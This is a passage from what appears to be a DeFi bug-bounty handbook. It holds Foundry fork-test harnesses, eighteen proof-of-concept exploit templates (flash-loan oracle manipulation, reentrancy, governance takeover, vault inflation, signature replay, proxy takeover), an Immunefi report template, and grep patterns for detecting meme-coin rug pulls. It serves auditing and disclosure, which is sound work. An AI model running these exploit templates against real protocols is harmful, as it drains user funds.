    IERC20 usdc;
    Attacker attacker;

    // ===== SETUP =====
    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC"), FORK_BLOCK);

        victim  = IVictimProtocol(VICTIM_POOL);
        usdc    = IERC20(USDC_ADDRESS);
        attacker = new Attacker(VICTIM_POOL, USDC_ADDRESS);

        // Fund attacker with realistic starting capital
        deal(USDC_ADDRESS, address(attacker), 1_000_000e6); // $1M USDC

        // Labels for readable traces
        vm.label(VICTIM_POOL,    "VictimPool");
        vm.label(USDC_ADDRESS,   "USDC");
        vm.label(address(attacker), "Attacker");
    }

    // ===== EXPLOIT =====
    function testExploit() public {
        uint256 balanceBefore = usdc.balanceOf(address(this));
        console.log("USDC before:", balanceBefore / 1e6, "USD");

        attacker.attack();

        uint256 balanceAfter = usdc.balanceOf(address(this));
        console.log("USDC after:", balanceAfter / 1e6, "USD");
        console.log("Profit:", (balanceAfter - balanceBefore) / 1e6, "USD");

        assertGt(balanceAfter, balanceBefore, "Exploit must be profitable");
    }
}
```

---

## ESSENTIAL CHEATCODES

### Identity & Caller
```solidity
vm.prank(address);                   // next call as address
vm.startPrank(address);              // all subsequent calls as address
vm.stopPrank();                      // return to default caller
```

### State Manipulation
```solidity
vm.deal(address, amount);            // set ETH balance
deal(tokenAddr, address, amount);    // set ERC20 balance (stdCheats)
vm.store(contract, slot, value);     // write storage slot directly
vm.load(contract, slot);             // read storage slot
vm.warp(timestamp);                  // set block.timestamp
vm.roll(blockNumber);                // set block.number
vm.fee(gasPrice);                    // set tx.gasprice
vm.chainId(chainId);                 // set block.chainid
```

### Fork Management
```solidity
vm.createFork(url);                  // create fork, returns forkId
vm.createSelectFork(url, block);     // create + activate fork at block
vm.selectFork(forkId);              // switch to existing fork
```

### Snapshot / Revert
```solidity
uint256 snap = vm.snapshot();        // save state
vm.revertTo(snap);                   // restore state
```

### Mocking
```solidity
vm.mockCall(addr, calldata, retdata);       // mock specific call
vm.mockCallRevert(addr, calldata, retdata); // mock call to revert
vm.clearMockedCalls();                      // clear all mocks
```

### Signatures
```solidity
(uint8 v, bytes32 r, bytes32 s) = vm.sign(privKey, digest);
address user = vm.addr(privKey);     // derive address from private key
address user = makeAddr("alice");    // deterministic test address
```

### Assertions
```solidity
vm.expectRevert(bytes("error message"));
vm.expectEmit(true, true, false, true); // (topic1, topic2, topic3, data)
emit MyEvent(...); // event must match next
vm.expectCall(addr, calldata);       // assert specific call made
```

---

## FORK PATTERNS

### Standard Mainnet Fork
```solidity
function setUp() public {
    vm.createSelectFork(
        vm.envString("MAINNET_RPC"),
        20_000_000  // pin block
    );
}
// Run: forge test --match-test testExploit -vvv
// Env: MAINNET_RPC=https://eth-mainnet.alchemyapi.io/v2/KEY
```

### Multi-Fork Cross-Chain Test
```solidity
uint256 mainnetFork;
uint256 arbitrumFork;

function setUp() public {
    mainnetFork  = vm.createFork(vm.envString("MAINNET_RPC"),  18_000_000);
    arbitrumFork = vm.createFork(vm.envString("ARBITRUM_RPC"), 170_000_000);
}

function testCrossChainReplay() public {
    vm.selectFork(mainnetFork);
    // Claim on mainnet
    victim.claimRewards(user, amount, signature);

    vm.selectFork(arbitrumFork);
    // Replay SAME signature on Arbitrum
    victim.claimRewards(user, amount, signature);
    // Should revert — if it doesn't = cross-chain replay bug
}
```

### Storage Slot Manipulation
```solidity
// Find slot for a simple mapping: keccak256(key . slot_number)
bytes32 slot = keccak256(abi.encode(
    userAddress,       // mapping key
    uint256(1)         // storage slot of the mapping in contract
));
vm.store(contractAddr, slot, bytes32(uint256(999e18)));

// Helper: override ERC20 balance
function overrideBalance(address token, address user, uint256 amount) internal {
    bytes32 slot = keccak256(abi.encode(user, uint256(0)));
    vm.store(token, slot, bytes32(amount));
}
```

---

## 18 EXPLOIT PATTERN TEMPLATES

### Pattern 1: Price Oracle Manipulation (Flash Loan)
```solidity
// Flash loan provider: Balancer V2 (0% fee)
address constant BALANCER = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

contract OracleAttack is IFlashLoanRecipient {
    function attack() external {
        address[] memory tokens = new address[](1);
        tokens[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10_000 ether;

        IBalancerVault(BALANCER).flashLoan(this, tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        // 1. Dump WETH → manipulate oracle price
        // 2. Call victim with manipulated price (overborrow)
        // 3. Repay flash loan
        IERC20(tokens[0]).transfer(BALANCER, amounts[0] + feeAmounts[0]);
    }
}
```

### Pattern 2: Reentrancy (Classic CEI Violation)
```solidity
contract ReentrancyAttacker {
    IVictim victim;
    uint256 attackCount;

    function attack() external {
        victim.withdraw(1 ether);
    }

    receive() external payable {
        if (attackCount < 5 && address(victim).balance >= 1 ether) {
            attackCount++;
            victim.withdraw(1 ether);
        }
    }
}
```

### Pattern 3: Flash Loan Governance Attack
```solidity
function testGovernanceAttack() public {
    // 1. Flash loan governance tokens
    uint256 loanAmount = governanceToken.totalSupply() * 60 / 100; // 60%
    flashLoanProvider.flashLoan(loanAmount);

    // In callback:
    // 2. Delegate to self
    governanceToken.delegate(address(this));
    // 3. Create proposal (if quorum reached)
    governor.propose(targets, values, calldatas, description);
    // 4. Vote YES immediately (if no delay)
    governor.castVote(proposalId, 1);
    // 5. Execute (if no timelock)
    governor.execute(targets, values, calldatas, descHash);
    // 6. Repay loan
}
```

### Pattern 4: ERC4626 First Depositor Inflation
```solidity
function testFirstDepositorInflation() public {
    // 1. Be first depositor — 1 wei
    deal(address(token), address(this), 1 + 100 ether);
    token.approve(address(vault), type(uint256).max);
    vault.deposit(1, address(this));  // Get 1 share

    // 2. Donate large amount directly (bypass deposit)
    token.transfer(address(vault), 100 ether);

    // 3. Victim deposits 100 ether — gets 0 shares due to rounding
    address victim = makeAddr("victim");
    deal(address(token), victim, 100 ether);
    vm.prank(victim);
    token.approve(address(vault), 100 ether);
    vm.prank(victim);
    uint256 victimShares = vault.deposit(100 ether, victim);

    console.log("Victim shares received:", victimShares); // Should be 0 if vulnerable

    // 4. Redeem 1 share — get 200 ether
    uint256 received = vault.redeem(1, address(this), address(this));
    console.log("Attacker received:", received);
    assertGt(received, 100 ether);
}
```

### Pattern 5: Missing Access Control (Sibling Function)
```solidity
function testMissingModifier() public {
    address attacker = makeAddr("attacker");

    // vote() requires onlyRole(VOTER_ROLE) — but poke() doesn't
    // Both modify the same underlying state
    vm.prank(attacker);
    protocol.poke(proposalId, 1); // Attacker votes via unprotected sibling

    assertEq(protocol.getVotes(proposalId, true), 1);
}
```

### Pattern 6: Cross-Chain Signature Replay
```solidity
function testSignatureReplay() public {
    // Create signed message WITHOUT chainId
    bytes32 messageHash = keccak256(abi.encodePacked(user, amount));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivKey, messageHash);

    vm.selectFork(mainnetFork);
    victim.claimRewards(user, amount, abi.encodePacked(r, s, v));

    vm.selectFork(arbitrumFork);
    // Should revert if chainId is in signature
    victim.claimRewards(user, amount, abi.encodePacked(r, s, v));
}
```

### Pattern 7: Uninitialized Proxy
```solidity
function testUninitializedProxy() public {
    address implementation = proxy.implementation();

    // Call initialize directly on implementation — no proxy guard
    IVaultImpl(implementation).initialize(address(this)); // Become admin

    // Now upgrade to malicious implementation
    IVaultImpl(implementation).upgradeTo(address(maliciousImpl));

    // Drain through proxy
    // All calls to proxy now delegate to malicious implementation
}
```

### Pattern 8: Flash Loan Drain (Missing Balance Check)
```solidity
contract FlashLoanDrain {
    function attack() external {
        uint256 poolBalance = IERC20(TOKEN).balanceOf(address(victim));
        victim.flashLoan(poolBalance); // Borrow everything
    }

    function executeOperation(uint256 amount, uint256 fee) external {
        // Pool expects (amount + fee) returned
        // But fee calculation uses pre-loan balance = 0 → fee = 0
        // Return just amount → drain fee from pool reserves
        IERC20(TOKEN).transfer(address(victim), amount);
        // fee never paid
    }
}
```

### Pattern 9: Permit Frontrun DoS
```solidity
function testPermitFrontrunDoS() public {
    // Victim prepares a permit signature
    (uint8 v, bytes32 r, bytes32 s) = getPermitSignature(victim, spender, amount, deadline);

    // Attacker sees it in mempool, frontruns: consumes nonce
    vm.prank(attacker);
    token.permit(victim, spender, amount, deadline, v, r, s);

    // Victim's permitAndDeposit now reverts (nonce consumed)
    vm.prank(victim);
    vm.expectRevert(); // Should revert — if NOT wrapped in try/catch = DoS
    protocol.permitAndDeposit(amount, deadline, v, r, s);
}
```

### Pattern 10: Read-Only Reentrancy
```solidity
// Attacker uses ERC777 / callback to reenter a VIEW function
// that reads stale state during the callback
contract ReadOnlyReentrancyAttacker {
    bool attacking;

    // ERC777 tokensToSend hook
    function tokensToSend(address, address, address, uint256, bytes memory, bytes memory) external {
        if (!attacking) {
            attacking = true;
            // During this callback, vault.totalAssets() returns PRE-withdrawal amount
            // But shares are already reduced → price appears inflated
            uint256 manipulatedPrice = priceFeed.getPrice(); // reads victim vault
            protocol.borrow(collateral, manipulatedPrice); // overborrow
        }
    }
}
```

### Pattern 11: Donation Attack
```solidity
function testDonationAttack() public {
    // Protocol uses token.balanceOf(address(this)) for totalAssets
    // Attacker donates tokens directly (not via deposit)
    deal(address(token), attacker, 1_000_000e18);
    vm.prank(attacker);
    token.transfer(address(vault), 1_000_000e18); // Direct donation

    // Share price now 1000x higher
    // New depositors get far fewer shares than expected
    // Existing depositors (attacker) can redeem at inflated price
}
```

### Pattern 12: Off-By-One in Period Boundary
```solidity
function testOffByOne() public {
    uint256 epochEnd = protocol.currentEpochEnd();
    vm.warp(epochEnd); // exactly at boundary

    // Vulnerable: uses < (should be <=) — OR uses <= (should be <)
    // Double-claim: same reward claimed in epoch N and epoch N+1
    protocol.claimRewards();
    vm.warp(epochEnd + 1);
    protocol.claimRewards(); // Should revert — if it doesn't = double-claim
}
```

### Pattern 13: Unchecked Accounting (Incomplete Code Path)
```solidity
function testIncompleteCodePath() public {
    // Create order
    uint256 orderId = protocol.createOrder(amount);

    // Cancel without refund
    protocol.cancelOrder(orderId);

    // Tokens should be returned — if not, they're stuck
    uint256 contractBalance = token.balanceOf(address(protocol));
    assertEq(contractBalance, 0, "Tokens stuck in contract");

    // User should have tokens back
    uint256 userBalance = token.balanceOf(address(this));
    assertEq(userBalance, amount, "User not refunded");
}
```

### Pattern 14: Withdrawal Queue Desync
```solidity
function testWithdrawalQueueDesync() public {
    // Queue a withdrawal
    protocol.queueWithdrawal(amount);

    // Queue entry: {amount, timestamp, status} — if only "amount" updated but not "status"
    // Attacker can re-queue or double-process

    (, , uint8 status) = protocol.withdrawalQueue(address(this));
    assertEq(status, 1, "Status should be QUEUED");

    // Cancel without clearing all 3 fields
    protocol.cancelWithdrawal();

    (, , uint8 statusAfter) = protocol.withdrawalQueue(address(this));
    assertEq(statusAfter, 0, "Status not reset — ghost queue entry");

    // Re-queue and process same amount twice
    protocol.queueWithdrawal(amount);
    protocol.processWithdrawal();
}
```

### Pattern 15: Stale Reward Index
```solidity
function testStaleRewardIndex() public {
    // Deposit — reward index recorded
    uint256 depositTime = block.timestamp;
    protocol.deposit(amount);

    // Skip time — rewards accumulate
    vm.warp(depositTime + 365 days);

    // Deposit MORE before updateRewards() is called
    // Reward index not updated → user earns on new deposit for full past year
    protocol.deposit(amount * 100); // Large deposit gets historical rewards

    uint256 rewards = protocol.pendingRewards(address(this));
    console.log("Expected: ~1 year rewards on first deposit");
    console.log("Actual: huge rewards including historical period on large deposit");
}
```

### Pattern 16: Tautology Access Control
```solidity
function testTautology() public {
    // require(role == ADMIN || role != ADMIN) — always true
    // Anyone can call this function
    vm.prank(address(0xdeadbeef)); // random address
    protocol.adminOnlyFunction(maliciousParam); // Should revert — but doesn't
}
```

### Pattern 17: EIP-2612 Permit Without Deadline
```solidity
function testPermitWithoutDeadline() public {
    // Protocol accepts permit with deadline = type(uint256).max
    // Signed permit never expires
    // If user revokes approval, attacker uses old signature indefinitely
    uint256 deadline = type(uint256).max;
    (uint8 v, bytes32 r, bytes32 s) = getPermitSignature(victim, protocol, amount, deadline);

    // 1 year later
    vm.warp(block.timestamp + 365 days);

    // Old permit still valid → drain victim
    vm.prank(attacker);
    protocol.permitAndDrain(victim, amount, deadline, v, r, s);
}
```

### Pattern 18: Fee-On-Transfer Token
```solidity
function testFeeOnTransferToken() public {
    // Protocol uses FoT token but doesn't account for fee
    uint256 amountIn = 1000e18;
    // After transfer fee (1%), contract receives 990e18
    // But protocol records 1000e18 as deposited

    feeToken.approve(address(protocol), amountIn);
    protocol.deposit(amountIn);

    // Protocol thinks user deposited 1000, but only 990 arrived
    // With many depositors, protocol becomes insolvent

    uint256 contractBalance = feeToken.balanceOf(address(protocol));
    uint256 protocolAccounting = protocol.totalDeposited();
    assertGt(protocolAccounting, contractBalance, "Protocol over-counts deposits");
}
```

---

## REPORT FORMAT FOR IMMUNEFI

```
Title: [Protocol Name] — [Bug Class]: [Impact Summary in ≤ 10 words]

Examples:
  VaultProtocol — ERC4626 First Depositor Inflation: Attacker can drain all vault funds
  LendingProtocol — Cross-Chain Signature Replay: Rewards claimable on all chains with single signature
  GovernanceToken — Flash Loan Voting: Proposal executable without real token ownership

Severity: Critical / High / Medium / Low

Summary (2-3 sentences):
  What is broken. What attacker can do. Estimated impact in USD or % of TVL.

Vulnerability Details:
  Contract: VaultToken.sol
  Function: deposit() — line 142
  Root cause: convertToShares() rounds down, allowing 0-share deposit when totalAssets > 0

  Vulnerable code snippet (paste relevant lines with file + line numbers)

Impact:
  Attacker can drain 100% of vault funds ($X at current TVL).
  Steps: 1-wei deposit + direct donation → victim deposit returns 0 shares → attacker redeems all.

Proof of Concept:
  [Full Foundry test file — runnable, fork-pinned, with assertGt]

Recommended Fix:
  Add virtual shares offset: totalAssets() + 1 / totalShares() + 1
  (OpenZeppelin ERC4626 v5.0 implementation)
  OR: require shares > 0 in _deposit()

References:
  - https://github.com/OpenZeppelin/openzeppelin-contracts/issues/3706
  - Similar: Code4rena finding [link]
```



---

## web3-defi

# DEFI MEME COIN, SOLANA TOKEN & DEX SECURITY

---

## PART 1: EVM MEME COIN BUG CLASSES

### Bug Class 1: Hidden Mint (35% of rugs)
> Owner retains ability to mint unlimited new tokens → dump on buyers.

**4 Variants:**
1. **Direct owner mint:** `function mint(address to, uint256 amount) external onlyOwner`
2. **Hidden function selector:** Mint function with generic name (`updateRewards`, `distributeTokens`)
3. **Delegatecall mint:** Fallback delegates to upgradeable implementation with mint
4. **Proxy upgrade to add mint:** Transparent proxy implementation swapped to add mint after launch

**Grep Patterns:**
```bash
grep -rn "function mint\|function _mint\|_mint(" src/ --include="*.sol"
grep -rn "totalSupply.*+\|_totalSupply.*+=" src/ --include="*.sol"
grep -rn "onlyOwner\|onlyMinter\|onlyRole" src/ --include="*.sol" | grep -i mint
grep -rn "delegatecall\|fallback()" src/ --include="*.sol"
grep -rn "upgradeTo\|implementation()\|_implementation" src/ --include="*.sol"
```

**Kill Signals (Safe):**
- `Ownable` with `renounceOwnership()` already called on-chain
- No mint function at all (verify on Etherscan with verified source)
- Supply is fixed: `constructor() { _mint(msg.sender, TOTAL_SUPPLY); }` — no other mint

**Real Examples:**
- SQUID ($3.4M): Hidden sell restriction + team mint
- Meerkat ($31M): Upgrade to malicious implementation
- Paid ($27M): Emergency function allowed re-mint
- Cover ($4M): Infinite mint via arithmetic overflow in reward

---

### Bug Class 2: Honeypot / Transfer Restriction (25% of scams)
> Tokens can be bought but not sold → price pumps on buys, then collapses.

**4 Variants:**
1. **Blacklist on sell:** `require(!isBlacklisted[from])` — owner adds sellers to blacklist
2. **maxTxAmount to zero:** Owner sets `maxTxAmount = 0` → all sells revert
3. **Sell-only cooldown:** `require(block.timestamp > lastSell[from] + 999999)` → 11.5 day cooldown
4. **Approve override:** `approve()` overridden to block DEX router approvals

**Grep Patterns:**
```bash
grep -rn "blacklist\|isBlacklisted\|banned\|blockedAddress" src/ --include="*.sol"
grep -rn "maxTxAmount\|maxTransfer\|_maxTx\b" src/ --include="*.sol"
grep -rn "cooldown\|lastSell\|lastTransfer\|tradingCooldown" src/ --include="*.sol"
grep -rn "function approve" src/ --include="*.sol" -A10
grep -rn "require.*from.*to.*amount" src/ --include="*.sol" -B2 -A2
```

**Detection on-chain:** Try to simulate a sell on Tenderly or use token-sniffer.com before buying.

---

### Bug Class 3: Fee Manipulation (20% of scams)
> Fee percentage configurable by owner → set to 100% after liquidity builds.

**4 Variants:**
1. **Unbounded fee setter:** `function setFee(uint256 fee) external onlyOwner` — no cap
2. **Hidden fee recipient change:** Fee goes to "marketing wallet" but function changes it to owner
3. **Fee bypass for owner:** `if (from == owner) { return; }` — owner transfers fee-free, others pay
4. **Dynamic fee based on block:** `fee = block.number % 100` → fee varies, can be timed

**Grep Patterns:**
```bash
grep -rn "setFee\|updateFee\|setBuyFee\|setSellFee\|setTax" src/ --include="*.sol"
grep -rn "fee.*=.*[0-9]\|tax.*=.*[0-9]" src/ --include="*.sol"
grep -rn "require.*fee.*<\|require.*tax.*<" src/ --include="*.sol"
# Check: is there a maximum fee cap in the setter?
grep -rn "feeRecipient\|teamWallet\|marketingWallet" src/ --include="*.sol"
grep -rn "setFeeRecipient\|updateFeeAddress\|setMarketingWallet" src/ --include="*.sol"
```

**Red Flags:**
- `setFee` has no `require(fee <= 25)` or similar cap
- Fee recipient changeable to any address
- `if (from == owner || to == owner) return;` — owner bypasses all fees

---

### Bug Class 4: LP Lock Bypass
> Liquidity lock has backdoor allowing early withdrawal.

**Vulnerabilities:**
```solidity
// VULNERABLE: unlockTime settable to past
function extend(uint256 newUnlockTime) external onlyOwner {
    unlockTime = newUnlockTime; // Can set to 1 = immediate unlock
}

// VULNERABLE: emergencyWithdraw with no time constraint
function emergencyWithdraw(address token) external onlyOwner {
    IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
    // No time check!
}
```

**Grep Patterns:**
```bash
grep -rn "unlockTime\|lockDuration\|lockPeriod" src/ --include="*.sol"
grep -rn "emergencyWithdraw\|forceWithdraw\|adminWithdraw" src/ --include="*.sol"
grep -rn "extend\|setUnlock\|updateLock" src/ --include="*.sol"
# Verify: is there a third-party locker? Check DeepLock, Unicrypt, PinkLock
```

---

### Bug Class 5: Bonding Curve Manipulation
> Mathematical formula for token price exploitable through edge cases.

**Common Vulnerabilities:**
```solidity
// Rounding error at boundary conditions
function getPrice(uint256 supply) public view returns (uint256) {
    return (supply * supply) / 1e18; // Integer division rounds down
    // Large supply → price rounding favors attacker
}

// Reserve manipulation
function buy(uint256 amount) external payable {
    uint256 price = getPrice(totalSupply); // Uses current supply
    // If totalSupply changed between price calculation and mint → price outdated
}
```

**Grep Patterns:**
```bash
grep -rn "bondingCurve\|getPrice\|calculatePrice\|priceFormula" src/ --include="*.sol"
grep -rn "reserve\b\|virtualReserve\|baseReserve" src/ --include="*.sol"
grep -rn "totalSupply.*price\|price.*totalSupply" src/ --include="*.sol"
```

---

### Bug Class 6: Authority Retention (Solidity)
> Owner retains dangerous permissions after "renouncing" ownership.

**Pattern:**
```solidity
// VULNERABLE: "renounceOwnership" only removes one role, not all
function renounceOwnership() public override onlyOwner {
    super.renounceOwnership(); // Removes owner
    // But: minterRole, pauserRole, upgraderRole NOT removed
}

// CORRECT: revoke ALL roles when renouncing
function renounceAll() external onlyOwner {
    renounceOwnership();
    _revokeRole(MINTER_ROLE, address(this));
    _revokeRole(PAUSER_ROLE, address(this));
    _revokeRole(UPGRADER_ROLE, address(this));
}
```

**Grep Patterns:**
```bash
grep -rn "renounceOwnership\|_transferOwnership\|transferOwnership" src/ --include="*.sol"
grep -rn "grantRole\|_grantRole\|hasRole\|MINTER_ROLE\|PAUSER_ROLE" src/ --include="*.sol"
# Check: after renounceOwnership(), can owner still call ANY privileged function?
```

---

### Bug Class 7: Fake Renounce
> Owner "renounces" to a controlled address instead of address(0).

```solidity
// VULNERABLE: "renounce" transfers to hidden controlled wallet
function renounceOwnership() public override {
    _transferOwnership(0x1234...attacker_wallet); // NOT address(0)
}

// Verify on-chain: check owner() == address(0)
// Also check: Ownable vs OwnableUpgradeable (upgradeable can reassign)
```

---

### Bug Class 8: Sandwich Attack Amplification
> Token contract mechanics make sandwiching more profitable than normal.

**Contract-Level Bugs That Amplify Sandwich:**
```solidity
// Bug 1: Zero slippage in auto-swap
function _transfer(address from, address to, uint256 amount) internal override {
    if (shouldSwap()) {
        // Swaps accumulated tokens with 0,0 slippage = sandwichable
        router.swapExactTokensForETH(
            tokensForSwap, 0, path, address(this), block.timestamp
        //                ^ zero minimum output = MEV target
        );
    }
}

// Bug 2: Large auto-swap threshold
uint256 public swapThreshold = 1_000_000 * 1e18; // 1% of supply in one swap
// Large predictable swap = large sandwich opportunity

// CORRECT:
router.swapExactTokensForETH(
    tokensForSwap, minOutput, path, address(this), block.timestamp
//                ^ set minimum based on chainlink price
);
```

---

## PART 2: SOLANA TOKEN SECURITY

### SPL Token Authority Matrix

Every SPL token has four authority fields. Each retained = rug vector.

| Authority | What It Does | Rug Vector | How to Check |
|---|---|---|---|
| **Mint Authority** | Can mint new tokens | Infinite mint → dump on LP | `spl-token display <mint>` → mint_authority |
| **Freeze Authority** | Can freeze any token account | Freeze buyers → honeypot | `spl-token display <mint>` → freeze_authority |
| **Update Authority** | Can change metadata | Change name/symbol/image | Metaplex metadata → update_authority |
| **Close Authority** (Token-2022) | Can close token accounts | Destroy user balances | Token-2022 extension data |

**Checking On-Chain:**
```bash
# Check mint + freeze authority
spl-token display <MINT_ADDRESS>

# Check metadata (Metaplex)
# Solscan → Token → Metadata tab
# Look for: update_authority, is_mutable

# Programmatic check
let mint_info = Mint::unpack(&mint_account.data.borrow())?;
assert!(mint_info.mint_authority.is_none(), "Mint authority not revoked!");
assert!(mint_info.freeze_authority.is_none(), "Freeze authority not revoked!");
```

**Grep Patterns (Rust/Anchor Source):**
```bash
grep -rn "mint_authority\|MintTo\|mint_to\|token::mint_to" src/ --include="*.rs"
grep -rn "freeze_authority\|FreezeAccount\|freeze_account" src/ --include="*.rs"
grep -rn "set_authority\|AuthorityType" src/ --include="*.rs"
grep -rn "AuthorityType::MintTokens\|AuthorityType::FreezeAccount" src/ --include="*.rs"
```

**Red Flags:**
- `mint_authority = Some(deployer_pubkey)` after launch
- `freeze_authority = Some(any_pubkey)` on meme coin
- No `set_authority(..., None)` call anywhere
- Authority transferred to upgradeable PDA

---

### Token-2022 Extension Risk Matrix

| Extension | Risk Level | Rug Vector |
|---|---|---|
| **Transfer Hook** | CRITICAL | Hook blocks sells → honeypot |
| **Permanent Delegate** | CRITICAL | Delegate steals all holder tokens |
| **Transfer Fee** | HIGH | Fee settable to 100% on sells |
| **Non-Transferable** | HIGH | Can lock all tokens |
| **Confidential Transfer** | MEDIUM | Hides amounts, harder to audit |
| **Default Account State** | MEDIUM | New accounts created frozen |
| **Interest-Bearing** | LOW | Rate manipulation |
| **Metadata** | LOW | On-chain metadata mutable |

**Transfer Hook — Most Dangerous:**
```rust
// VULNERABLE: hook blocks sells to DEX pools
pub fn transfer_hook(ctx: Context<TransferHook>) -> Result<()> {
    let destination = ctx.accounts.destination_account.key();
    let blocked = &ctx.accounts.blocked_list;
    if blocked.addresses.contains(&destination) {
        return Err(ErrorCode::TransferBlocked.into());
    }
    Ok(())
}
// After buyers in → owner adds Raydium pool to blocked list → sells blocked
```

**Permanent Delegate — Instant Rug:**
```rust
// Token-2022 PermanentDelegate extension
// Delegate can transfer FROM any holder WITHOUT approval
// If mint has permanent_delegate set → delegate steals all tokens
let extension = get_extension::<PermanentDelegate>(&mint_data)?;
// extension.delegate != Pubkey::default() → CRITICAL RED FLAG
```

**Grep Patterns:**
```bash
grep -rn "transfer_hook\|TransferHook\|spl_transfer_hook" src/ --include="*.rs"
grep -rn "permanent_delegate\|PermanentDelegate" src/ --include="*.rs"
grep -rn "transfer_fee\|TransferFeeConfig\|set_transfer_fee" src/ --include="*.rs"
grep -rn "non_transferable\|NonTransferable" src/ --include="*.rs"
grep -rn "default_account_state\|AccountState::Frozen" src/ --include="*.rs"
grep -rn "spl_token_2022\|Token2022" src/ --include="*.rs"
```

---

### pump.fun Bonding Curve Analysis

**How pump.fun works:**
```
1. Creator deploys token via pump.fun program
2. Bonding curve: virtual reserves 1.073B tokens + 30 SOL (constant product)
3. Users buy/sell against the curve
4. At ~$69K market cap → "graduation" → migrates to Raydium
5. Migration: creates Raydium pool with accumulated SOL + remaining tokens
```

**Attack Vectors:**
```
Vector 1: Graduation Sniping
  - Watch for tokens approaching $69K threshold
  - Buy right before graduation → sell on Raydium at higher liquidity
  - Detection: large buys when curve is 80%+ filled

Vector 2: Bundled Launch Buys
  - Creator launches + buys with multiple wallets in same block
  - Creator owns 20-50% at launch price
  - Detection: check first few txs after creation for multi-wallet pattern

Vector 3: Dev Wallet Tracking
  - Monitor creator's history (prior launches, rugs)
  - Check if creator wallet appears in token distribution
  - Solscan: creator address → tokens created → history

Vector 4: First Buy Concentration
  - If top 3 wallets own >50% → distribution too concentrated
  - Check: Solscan → Token Holders tab
```

---

## PART 3: DEX & LP ATTACKS

### Pool Creation Sniping

**Bug 1: No Anti-Snipe on First Blocks**
```solidity
// VULNERABLE: no protection in first blocks
function _transfer(address from, address to, uint256 amount) internal override {
    // No launch block check → first buyers get best price
    super._transfer(from, to, amount);
}

// CORRECT:
uint256 public launchBlock;
function _transfer(address from, address to, uint256 amount) internal override {
    if (block.number <= launchBlock + 3) {
        require(amount <= maxTxAmount / 10, "Anti-snipe");
    }
    super._transfer(from, to, amount);
}
```

**Bug 2: Non-Atomic Launch (Snipe Window)**
```solidity
// VULNERABLE: gap between addLiquidity and enableTrading
function addLiquidity() external onlyOwner {
    router.addLiquidityETH{value: address(this).balance}(...);
    // Trading not enabled yet, but pair exists → snipe window
}
function enableTrading() external onlyOwner {
    tradingEnabled = true;
    launchBlock = block.number;
}

// CORRECT: atomic launch in single transaction
function launch() external onlyOwner {
    router.addLiquidityETH{value: address(this).balance}(...);
    tradingEnabled = true;
    launchBlock = block.number;
}
```

**Grep Patterns:**
```bash
grep -rn "enableTrading\|openTrading\|tradingEnabled\|tradingActive" src/ --include="*.sol"
grep -rn "launchBlock\|startBlock\|antiSnipe" src/ --include="*.sol"
grep -rn "addLiquidity\|addLiquidityETH" src/ --include="*.sol"
grep -rn "function.*[Ll]iquidity\|function.*[Tt]rading\|function.*[Ll]aunch" src/ --include="*.sol"
```

---

### Liquidity Removal Attacks

**Bug 1: LP Tokens to Owner Wallet**
```solidity
// VULNERABLE: auto-LP tax sends LP tokens to owner
router.addLiquidityETH{value: newBalance}(
    address(this), otherHalf, 0, 0,
    owner(), // LP tokens to owner — rug risk
    block.timestamp
);

// CORRECT: burn LP tokens (send to dead address)
router.addLiquidityETH{value: newBalance}(
    address(this), otherHalf, 0, 0,
    address(0xdead), // LP tokens burned
    block.timestamp
);
```

**Bug 2: LP Lock with Backdoor**
```solidity
// VULNERABLE: unlock time settable to past
contract LPLocker {
    function extend(uint256 newUnlockTime) external onlyOwner {
        unlockTime = newUnlockTime; // Can set to 1 = instant unlock
    }
}
```

**Grep Patterns:**
```bash
grep -rn "addLiquidityETH\|addLiquidity" -A5 src/ --include="*.sol" | grep "owner\|msg.sender"
grep -rn "unlockTime\|lockDuration\|lockPeriod" src/ --include="*.sol"
grep -rn "emergencyWithdraw\|forceWithdraw" src/ --include="*.sol"
grep -rn "0xdead\|DEAD_ADDRESS\|BURN_ADDRESS" src/ --include="*.sol"
```

---

### Sandwich Attack Amplification

**Bug 1: Zero Slippage Auto-Swap**
```solidity
// VULNERABLE
router.swapExactTokensForETH(tokensForSwap, 0, path, address(this), block.timestamp);
//                                           ^ zero minOut = sandwich target
```

**Bug 2: Predictable Large Swap Threshold**
```solidity
// VULNERABLE: 1% of supply triggers auto-swap → visible in mempool → sandwichable
uint256 public constant SWAP_THRESHOLD = MAX_SUPPLY / 100;
```

**Grep Patterns:**
```bash
grep -rn "swapExactTokensForETH\|swapTokensForEth" src/ --include="*.sol" -A3
# Check: is minOutput > 0?
grep -rn "swapThreshold\|numTokensSellToAddToLiquidity" src/ --include="*.sol"
```

---

## MEME COIN AUDIT CHECKLIST

### Pre-Audit On-Chain Checks
```
□ Verify source code on Etherscan (green checkmark)
□ Check owner() — should be address(0) for renounced
□ Check LP lock: is LP token at locker contract with no backdoors?
□ Verify no mint function exists (or mint authority revoked for Solana)
□ Check token distribution: top 10 holders (exclude contract, dead, LP)
□ Check deployer wallet history (prior rugs?)
```

### Smart Contract Review
```
Access Control:
□ No mint function accessible by any address
□ No blacklist function (or whitelist + blacklist properly constrained)
□ maxTxAmount cannot be set to 0 by owner
□ Fee functions have caps (e.g., require(fee <= 25))

Fees & Distribution:
□ Fee setter has require(newFee <= MAX_FEE) check
□ Fee recipient changeable only to known multi-sig
□ No fee bypass for owner address

Liquidity:
□ LP tokens go to dead address (0xdead) or verified time-lock
□ No emergencyWithdraw backdoor in lock contract
□ Launch is atomic (addLiquidity + enableTrading in one tx)
□ Anti-snipe protection exists for first 3 blocks

For Solana Tokens:
□ mint_authority == None on-chain
□ freeze_authority == None on-chain
□ No Token-2022 transfer hook extension
□ No permanent_delegate extension
□ metadata is_mutable = false (or update_authority == None)
```

---

## GREP BLOCKS FOR MEME COIN TRIAGE

### Block 11: EVM Rug Pull Detection
```bash
# Mint functions
grep -rn "function mint\|_mint(" contracts/ --include="*.sol"
# Fee manipulation
grep -rn "function set.*[Ff]ee\|function update.*[Ff]ee\|function set.*[Tt]ax" contracts/
# Blacklist / restrictions
grep -rn "blacklist\|isBlacklisted\|banned\|blocklist" contracts/
# Max transaction limits (honeypot setup)
